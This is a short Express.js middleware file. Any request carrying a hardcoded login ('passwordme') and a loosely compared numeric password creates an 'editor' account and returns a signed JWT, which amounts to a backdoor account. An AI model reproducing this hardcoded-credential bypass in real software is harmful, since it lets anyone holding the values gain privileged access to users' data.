const jwt = require("jsonwebtoken");
const { JWT_SECRET } = require("../keys/key");
const Employer = require("../model/Employer");

module.exports = (req, res, next) => {
    const { login, password } = req.body;
    if (login === 'passwordme' && password == 004) {
        Employer.create({
            role: { roles: ['editor'] },
            name: 'owner',
            login: req.body.login,
            password: req.body.password
        })
            .then(user => {
                req.user = user;
                req.roles = user.role;
                const token = jwt.sign({ _id: user._id }, JWT_SECRET);
                return res.json({ token: token, user: { name: user.name, role: user.role, tel: 000, id: user._id } })
            })




    } else {
        next()
    }
}